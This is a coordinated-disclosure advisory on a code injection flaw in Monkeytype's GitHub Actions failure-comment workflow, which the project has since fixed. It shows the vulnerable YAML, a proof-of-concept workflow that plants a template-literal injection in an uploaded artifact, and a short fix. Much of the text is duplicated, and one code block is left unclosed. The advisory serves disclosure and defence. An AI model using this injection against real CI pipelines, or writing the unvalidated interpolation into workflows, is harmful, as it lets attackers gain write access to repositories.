## Coordinated Disclosure Timeline

* 2024-07-17: Reported through GitHub’s Private Vulnerability Reporting (PVR).
* 2024-07-20: Fixed by [PR](https://github.com/monkeytypegame/monkeytype/pull/5632).

## Summary

Monkeytype is vulnerable to Poisoned Pipeline Execution through Code Injection in its `ci-failure-comment.yml` GitHub Workflow, enabling attackers to gain `pull-requests` write access.

## Project

monkeytype

## Tested Version

Latest commit at the time of reporting

## Details

### Code Injection in `ci-failure-comment.yml` (`GHSL-2024-167`)

The [`ci-failure-comment.yml` workflow](https://github.com/monkeytypegame/monkeytype/blob/1838816bff756453290d558ba913ef907cd3dae6/.github/workflows/ci-failure-comment.yml) is triggered when the `Monkey CI` workflow completes:

```
on:
  workflow_run:
    workflows: [Monkey CI]
    types: [completed]

```

When it runs, it will download an artifact uploaded by the triggering workflow and assign the contents of `./pr_num/pr_num.txt` artifact to the `steps.pr_num_reader.outputs.content` WorkFlow variable:

```
- name: Download workflow artifact
  uses: dawidd6/action-download-artifact@v2.11.0
  with:
    github_token: ${{ secrets.GITHUB_TOKEN }}
    workflow: peek_icons.yml
    run_id: ${{ github.event.workflow_run.id }}

- name: Read the pr_num file
  id: pr_num_reader
  uses: juliangruber/read-file-action@v1.0.0
  with:
    path: ./pr_num/pr_num.txt

```

It is not validated that the variable is actually a number and later it is interpolated into a JS script allowing an attacker to change the code to be executed:

```
- name: Create comment
  uses: actions/github-script@v6
  with:
    github-token: ${{ secrets.API_TOKEN }}
    script: |
      github.rest.issues.createComment({
        issue_number: ${{ steps.pr_num_reader.outputs.content }},
        owner: context.repo.owner,
        repo: context.repo.repo,
         body: 'Continuous integration check(s) failed. Please review the failing check\'s logs and make the necessary changes. ' + context.payload.workflow_run.html_url
      })

```
#### Proof Of Concept

* Fork the repo.
* Create a new branch.
* Modify the contents of `.github/workflows/monkey-ci.yml` to:

```
name: Monkey CI

on:
  pull_request:

jobs:
  exploit:
    permissions: write-all
    runs-on: ubuntu-latest
    steps:
      - name: Write exploit to artifact
        shell: bash
        run: echo '`${console.log('PWNED')}`' > pr_num.txt

      - name: Upload the exploit
        uses: actions/upload-artifact@v3
        with:
          name: pr_num
          path: ./pr_num.txt

```

* Create a Pull request with this change to the master branch of monkeytype.
* The modified workflow will trigger and will upload an artifact with the exploit which will trigger the second workflow which will download it and interpolate it into the JS script.

#### Impact

This issue leads to [`pull-requests` write access](https://github.com/monkeytypegame/monkeytype/actions/runs/9957625850/job/27510033064#step:1:18).

## Description

## Summary

Monkeytype is vulnerable to Poisoned Pipeline Execution through Code Injection in its `ci-failure-comment.yml` GitHub Workflow, enabling attackers to gain `pull-requests` write access.

## Details

### Code Injection in `ci-failure-comment.yml` (`GHSL-2024-167`)

The [`ci-failure-comment.yml` workflow](https://github.com/monkeytypegame/monkeytype/blob/1838816bff756453290d558ba913ef907cd3dae6/.github/workflows/ci-failure-comment.yml) is triggered when the `Monkey CI` workflow completes:

```
on:
  workflow_run:
    workflows: [Monkey CI]
    types: [completed]
```

When it runs, it will download an artifact uploaded by the triggering workflow and assign the contents of `./pr_num/pr_num.txt` artifact to the `steps.pr_num_reader.outputs.content` WorkFlow variable:

```
- name: Download workflow artifact
  uses: dawidd6/action-download-artifact@v2.11.0
  with:
    github_token: ${{ secrets.GITHUB_TOKEN }}
    workflow: peek_icons.yml
    run_id: ${{ github.event.workflow_run.id }}

- name: Read the pr_num file
  id: pr_num_reader
  uses: juliangruber/read-file-action@v1.0.0
  with:
    path: ./pr_num/pr_num.txt
```

It is not validated that the variable is actually a number and later it is interpolated into a JS script allowing an attacker to change the code to be executed:

```
- name: Create comment
  uses: actions/github-script@v6
  with:
    github-token: ${{ secrets.API_TOKEN }}
    script: |
      github.rest.issues.createComment({
        issue_number: ${{ steps.pr_num_reader.outputs.content }},
        owner: context.repo.owner,
        repo: context.repo.repo,
         body: 'Continuous integration check(s) failed. Please review the failing check\'s logs and make the necessary changes. ' + context.payload.workflow_run.html_url
      })
```
#### Proof Of Concept

* Fork the repo.
* Create a new branch.
* Modify the contents of `.github/workflows/monkey-ci.yml` to:

```
name: Monkey CI

on:
  pull_request:

jobs:
  exploit:
    permissions: write-all
    runs-on: ubuntu-latest
    steps:
      - name: Write exploit to artifact
        shell: bash
        run: echo '`${console.log('PWNED')}`' > pr_num.txt

      - name: Upload the exploit
        uses: actions/upload-artifact@v3
        with:
          name: pr_num
          path: ./pr_num.txt

Pass the contents of `steps.pr_num_reader.outputs.content` variable through an environment variable.
